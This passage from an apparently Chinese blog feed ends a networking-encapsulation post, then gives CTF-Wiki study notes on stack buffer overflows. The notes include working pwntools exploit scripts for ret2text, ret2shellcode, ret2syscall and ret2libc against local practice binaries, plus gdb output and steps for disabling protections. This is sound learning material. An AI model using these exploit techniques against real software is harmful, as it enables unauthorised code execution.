&lt;p&gt;然后TCP数据报再嵌入IP数据报,IP数据报需要设置双方的IP地址,这是已知的.发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。&lt;/p&gt;
&lt;h5 id=&#34;ethernet协议&#34;&gt;Ethernet协议&lt;/h5&gt;
&lt;p&gt;最后IP数据报嵌入以太网数据报,以太网数据报设置双方的MAC地址,发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。&lt;/p&gt;
&lt;p&gt;以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/2024070405.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;服务器端响应&#34;&gt;服务器端响应&lt;/h5&gt;
&lt;p&gt;经过多个网关转发,Google服务器收到了这四个以太网数据报.根据IP Head的序号,Google将四个包拼接起来,取出完整的TCP数据,根据其中的HTTP请求作出HTTP响应,再用TCP协议发回.本机收到HTTP响应后,就可以将网页显示出来,完成一次网络通信.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CTF Wiki</title>
      <link>https://wander1ng.com/post/ctf-wiki/</link>
      <pubDate>Thu, 20 Jun 2019 00:06:21 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/ctf-wiki/</guid>
      <description>&lt;p&gt;从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X01&amp;ndash;栈溢出的基本原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:&lt;u&gt;1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;函数调用指令: &lt;strong&gt;CALL&lt;/strong&gt;(注意理解EBP的变化过程，它指向下一条指令要操作的数据)&lt;/p&gt;
&lt;p&gt;大致过程:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;参数入栈&lt;/li&gt;
&lt;li&gt;返回地址入栈&lt;/li&gt;
&lt;li&gt;代码区块跳转&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;栈帧调整:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)&lt;/li&gt;
&lt;li&gt;将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)&lt;/li&gt;
&lt;li&gt;给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/t01b9be9878dadebed6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X02&amp;ndash;栈溢出的保护类型：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Canary&lt;/strong&gt;：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。&lt;u&gt;编译时的关闭指令：-fno-stack-protector&lt;/u&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ALSR与PIE(Position Independent Executable)&lt;/strong&gt;：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）
&lt;u&gt;编译时ALSR的关闭指令：echo 0&amp;gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态&lt;/u&gt;，可以用cat+路径显示相关的参数：
0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。&lt;/p&gt;
&lt;p&gt;&lt;u&gt;PIE编译时的关闭指令：-no-pie&lt;/u&gt;，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令&lt;code&gt;gcc -v&lt;/code&gt;查看 gcc 默认的开关情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Linux平台下的NX,Windows平台上的DEP&lt;/strong&gt;：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;0X03&amp;ndash;编译指令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）&lt;/p&gt;
&lt;p&gt;sudo -s
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/p&gt;
&lt;p&gt;($ cat /proc/sys/kernel/randomize_va_space指令检查)
exit（关闭ALSR)
-z execstack（关闭NX保护）&lt;/p&gt;
&lt;p&gt;test.c -o test(由test.c生成test可执行文件)&lt;/p&gt;
&lt;p&gt;-g(GDB调试)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X04&amp;ndash;ROP原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;程序存在溢出，并且可以控制返回地址。&lt;/li&gt;
&lt;li&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ropgadget，注意命令格式：ROPgadget &amp;ndash;binary [文件名] &amp;ndash;only’寄存器名|寄存器名’ | grep ‘eax’。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X05&amp;ndash;四种类型：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种类型ret2text:&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
void success() 
{ 
puts(“You Hava already controlled it.”); 
}
void vulnerable()
{
char s[12];
gets(s);
puts(s);
return;
}
int main(int argc, char **argv) 
{
vulnerable();
return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。&lt;/p&gt;
&lt;p&gt;EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;##coding=utf8
## 导入pwntools库
from pwn import *
## 构造与程序交互的对象，sh = process(&amp;#39;./文件名&amp;#39;)表示打本地，日自己。
sh = process(&amp;#39;./stack_example&amp;#39;)
## 已知了想要执行的函数地址
success_addr = 0x0804843b
## 构造payload
payload = &amp;#39;a&amp;#39; * 0x14 + &amp;#39;bbbb&amp;#39; + p32(success_addr)
##print可以帮助自己看脚本执行到了哪一步
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&amp;#34;There is something amazing here, do you know anything?&amp;#34;);
  gets((char *)&amp;amp;v4);
  printf(&amp;#34;Maybe I will tell you next time !&amp;#34;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(&amp;quot;/bin/sh&amp;quot;)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  &amp;#34;__libc_start_main&amp;#34;
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &amp;#34;__libc_start_main&amp;#34;
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  &amp;lt;main+102&amp;gt; call 0x8048460 &amp;lt;gets@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;断点下在Call处**&lt;u&gt;为什么是这个Call处？&lt;/u&gt;**(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。&lt;/p&gt;
&lt;p&gt;每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。&lt;strong&gt;计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;##!/usr/bin/env python

from pwn import *

sh = process(&amp;#39;./ret2text&amp;#39;)

target = 0x0804863a

sh.sendline(&amp;#39;A&amp;#39; * (0x6c+4) + p32(target))

sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二种类型ret2shellcode：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的&lt;strong&gt;汇编代码&lt;/strong&gt;，常见的功能主要是获取目标系统的 shell。&lt;strong&gt;一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码&lt;/strong&gt;。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&amp;#34;No system for you this time !!!&amp;#34;);
  gets((char *)&amp;amp;v4);
  strncpy(buf2, (const char *)&amp;amp;v4, 0x64u);
  printf(&amp;#34;bye bye ~&amp;#34;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过vmmap观察该bss段是否可执行：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。&lt;/p&gt;
&lt;p&gt;EXP如下:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/usr/bin/env python
from pwn import *
sh = process(&amp;#39;./ret2shellcode&amp;#39;)
## 自动生成shellcode
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
## shellcode先放入，剩余的再用&amp;#39;A&amp;#39;填充至112长度。
sh.sendline(shellcode.ljust(112, &amp;#39;A&amp;#39;) + p32(buf2_addr))
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;第三种类型：ret2syscall：&lt;/strong&gt;
即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;execve(&amp;#34;/bin/sh&amp;#34;,NULL,NULL)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于该程序是 32 位，所以我们需要使得&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统调用号，即 eax 应该为 0xb&lt;/li&gt;
&lt;li&gt;第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。&lt;/li&gt;
&lt;li&gt;第二个参数，即 ecx 应该为 0&lt;/li&gt;
&lt;li&gt;第三个参数，即 edx 应该为 0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。&lt;/p&gt;
&lt;p&gt;具体实现&amp;ndash;ropgadgets 这个工具:&lt;/p&gt;
&lt;p&gt;only ‘pop|ret’ | grep &amp;rsquo;eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(&amp;quot;/bin/sh&amp;quot;,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。&lt;/p&gt;
&lt;p&gt;平凡无奇的存在栈溢出漏洞的程序源码如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&amp;#34;This time, no system() and NO SHELLCODE!!!&amp;#34;);
  puts(&amp;#34;What do you plan to do?&amp;#34;);
  gets(&amp;amp;v4);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;此外，我们需要获得 /bin/sh 字符串对应的地址。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  ret2syscall ROPgadget --binary rop  --string &amp;#39;/bin/sh&amp;#39; 
Strings information
============================================================
0x080be408 : /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及int 0x80的地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  ret2syscall ROPgadget --binary rop  --only &amp;#39;int&amp;#39;                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/usr/bin/env python
from pwn import *

sh = process(&amp;#39;./rop&amp;#39;)

## 找到的gadgets及其地址
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。
payload = flat([&amp;#39;A&amp;#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

sh.sendline(payload)
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第四种类型：ret2libc&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(&amp;quot;/bin/sh&amp;quot;).&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&amp;#34;RET2LIBC &amp;gt;_&amp;lt;&amp;#34;);
  gets((char *)&amp;amp;v4);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;确定存在栈溢出漏洞,&lt;u&gt;用IDA找到了system函数,用ropgadget查找到&amp;quot;/bin/sh&amp;quot;&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;则EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/usr/bin/env python
from pwn import *

sh = process(&amp;#39;./ret2libc1&amp;#39;)

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([&amp;#39;a&amp;#39; * 112, system_plt, &amp;#39;b&amp;#39; * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&amp;rsquo;bbbb&amp;rsquo; 作为虚假的地址，其后参数对应的参数内容。&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;当查找不到&amp;quot;/bin/sh&amp;quot;时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。&lt;/p&gt;
&lt;p&gt;EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;##!/usr/bin/env python
from pwn import *

sh = process(&amp;#39;./ret2libc2&amp;#39;)

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat([&amp;#39;a&amp;#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline(&amp;#39;/bin/sh&amp;#39;)
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意payload中的pop_ebx是用来平衡堆栈的。&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;同时找不到&amp;quot;/bin/sh&amp;quot;与system()函数地址的情况，用到了两个知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。&lt;/li&gt;
&lt;li&gt;即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。&lt;/p&gt;
&lt;p&gt;此外，libc中是一定存在&amp;quot;/bin/sh&amp;quot;的，所以字符串地址也可以获取。这方面工具做的很完善。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&amp;#34;No surprise anymore, system disappeard QQ.&amp;#34;);
  printf(&amp;#34;Can you find it !?&amp;#34;);
  gets((char *)&amp;amp;v4);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;泄露 __libc_start_main 地址&lt;/li&gt;
&lt;li&gt;获取 libc 版本&lt;/li&gt;
&lt;li&gt;获取 system 地址与 /bin/sh 的地址&lt;/li&gt;
&lt;li&gt;再次执行源程序&lt;/li&gt;
&lt;li&gt;触发栈溢出执行 system(‘/bin/sh’)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;EXP如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/usr/bin/env python
from pwn import *
## 导入工具
from LibcSearcher import LibcSearcher
## 本地连接
sh = process(&amp;#39;./ret2libc3&amp;#39;)
## 将文件加载入进程
ret2libc3 = ELF(&amp;#39;./ret2libc3&amp;#39;)

##简化libc库中函数地址的表示方法
puts_plt = ret2libc3.plt[&amp;#39;puts&amp;#39;]
libc_start_main_got = ret2libc3.got[&amp;#39;__libc_start_main&amp;#39;]
main = ret2libc3.symbols[&amp;#39;main&amp;#39;]

## 监视程序进行到哪一步，提醒自己
print &amp;#34;leak libc_start_main_got addr and return to main again&amp;#34;
## puts函数泄露出start_main函数地址
payload = flat([&amp;#39;A&amp;#39; * 112, puts_plt, main, libc_start_main_got])

## 在输出前面字符串后，将payload输入
sh.sendlineafter(&amp;#39;Can you find it !?&amp;#39;, payload)

print &amp;#34;get the related addr&amp;#34;
##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式
libc_start_main_addr = u32(sh.recv()[0:4])
##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。
libc = LibcSearcher(&amp;#39;__libc_start_main&amp;#39;, libc_start_main_addr)
## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。
libcbase = libc_start_main_addr - libc.dump(&amp;#39;__libc_start_main&amp;#39;)
## 已知基地址与相对地址，得到绝对地址
system_addr = libcbase + libc.dump(&amp;#39;system&amp;#39;)
binsh_addr = libcbase + libc.dump(&amp;#39;str_bin_sh&amp;#39;)

## 监视程序进行到哪一步
print &amp;#34;get shell&amp;#34;

payload = flat([&amp;#39;A&amp;#39; * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;0X05&amp;ndash;稍作总结：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X06&amp;ndash;MISC:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.最简单栈溢出，一套工具解决。&lt;/p&gt;
&lt;p&gt;python pattern.py create 150
gdb X
run
(input)
q(uit)
python pattern.py offset (address)&lt;/p&gt;
&lt;p&gt;即可得到溢出地址&lt;/p&gt;
&lt;p&gt;2.注意是返回地址，不是/bin/sh本身在栈上。&lt;/p&gt;
&lt;p&gt;3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。&lt;/p&gt;
&lt;p&gt;4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。&lt;/p&gt;
&lt;p&gt;5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。&lt;/p&gt;
&lt;p&gt;6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。&lt;/p&gt;
&lt;p&gt;7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。&lt;/p&gt;
&lt;p&gt;8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。&lt;/p&gt;
